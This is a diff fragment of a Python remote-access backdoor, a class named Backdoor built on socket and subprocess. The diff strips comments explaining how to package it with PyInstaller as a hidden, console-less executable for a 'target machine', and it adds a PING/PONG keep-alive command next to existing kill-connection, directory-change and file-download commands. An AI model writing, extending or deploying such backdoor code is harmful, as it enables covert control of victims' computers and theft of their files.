@@ -1,13 +1,5 @@
 #!/usr/bin/env python
 
-# This application needs to run from the target machine
-# -------------------------------------UPDATE-------------------------------------
-# This application is meant to run as an executable from the target machine
-# To do so, you must have installed the python for the same OS as the target machine
-# Install PyInstaller with pip: python -m pip pyinstaller
-# Create the executable file:   python -m PyInstaller <file>.py --onefile --noconsole
-# The executable that needs to run from target machine is located in created dist directory
-
 import socket
 import subprocess
 import json
@@ -82,6 +74,8 @@ class Backdoor:
                 elif command[0] == "killconnection":
                     self.connection.close()
                     sys.exit()
+                elif command[0] == "PING":
+                    command_result = "PONG"
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = change_working_directory_to(command[1])
                 elif command[0] == "download":
